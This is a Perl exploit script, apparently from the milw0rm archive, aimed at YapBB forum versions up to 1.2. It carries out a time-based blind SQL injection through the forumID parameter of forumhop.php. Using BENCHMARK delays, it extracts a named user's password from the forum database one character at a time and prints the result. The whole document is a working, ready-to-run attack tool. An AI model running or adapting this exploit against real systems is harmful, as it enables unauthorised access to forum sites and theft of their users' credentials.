<html><head><title>YapBB <= 1.2 (forumID) Blind SQL Injection Exploit </title></head><pre>--+++======================================================+++--
--+++====== YapBB &lt;= 1.2 Blind SQL Injection Exploit ======+++--
--+++======================================================+++--

#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket;

sub usage
{
	die &quot;\nYapBB &lt;= 1.2 Blind SQL Injection Exploit&quot;.
	    &quot;\n[?] Author  : darkjoker&quot;.
	    &quot;\n[?] Site    : http://darkjoker.net23.net&quot;.
	    &quot;\n[?] CMS Site: http://yapbb.sourceforge.net/&quot;.
	    &quot;\n[?] Usage   : perl ${0} &lt;hostname&gt; &lt;path&gt; &lt;username&gt; [&lt;key_list&gt;]&quot;.
	    &quot;\n[?] Ex.     : perl ${0} localhost /YapBB root abcdefghijklmnopqrstuvwxyz&quot;.
	    &quot;\n\n&quot;;
}

sub query
{
	my ($user, $chr, $pos) = @_;
	my $query = &quot;123 OR IF ((ASCII(SUBSTRING((SELECT password FROM &quot;.
	&quot;forum_user WHERE nickname = '${user}'),${pos},1))=${chr}),BENCHMARK(200000000,CHAR(0)),0)&quot;;
	$query =~ s/ /%20/g;
	$query =~ s/'/%27/g;
	return $query;
}

sub exploit
{
	my ($hostname, $path, $user, $chr, $pos) = @_;
	$chr = ord ($chr);
	my $sock = new IO::Socket::INET (
						PeerHost =&gt; $hostname,
						PeerPort =&gt; 80,
						Proto    =&gt; &quot;tcp&quot;
					) or die &quot;\n[!] Exploit failed.\n\n&quot;;

	my $query = query ($user, $chr, $pos);
	my $request = &quot;GET ${path}/forumhop.php?action=next&amp;forumID=${query} HTTP/1.1\r\n&quot;.
		      &quot;Host: ${hostname}\r\n&quot;.
		      &quot;Connection: Close\r\n\r\n&quot;;
	
	my $a = time ();
	print $sock $request;
	$_++ while (&lt;$sock&gt;);
	$a = ($a - time ()) * -1;
	close ($sock);

	return 1 if ($a &gt; 4);
	return 0;
}
		
my ($hostname, $path, $user, $k_list) = @ARGV;
usage unless ($user);
my @key = split (&quot;&quot;, ($k_list) ? $k_list : &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;);
my $chr = 0;
my $pos = 1;
my $password;
while ($chr &lt; scalar (@key))
{
	if (exploit ($hostname, $path, $user, $key [$chr], $pos))
	{
		$password .= $key [$chr];
		$chr = 0;
		$pos++;
	}
	else
	{
		$chr++;
	}
}

print &quot;\n[+] Password: ${password}\n\n&quot;;

# milw0rm.com [2009-02-04]</pre></html>